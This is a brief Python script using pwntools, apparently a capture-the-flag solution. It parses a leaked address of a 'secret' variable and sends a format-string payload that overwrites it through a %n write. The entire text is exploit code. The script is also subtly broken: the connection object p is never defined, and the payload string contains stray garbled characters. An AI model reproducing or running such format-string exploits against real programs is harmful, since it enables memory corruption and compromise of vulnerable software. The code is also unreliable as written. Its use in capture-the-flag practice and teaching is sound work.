from pwn import *

p.recvuntil("`secret`: ")

addr_secret = int(p.recvline()[:-1], 16)

fstring = b"%3123415c^@#!$%@%8$n".ljust(16)
fstring += p64(addr_secret)

p.sendline(fstring)

print(p.recvall())
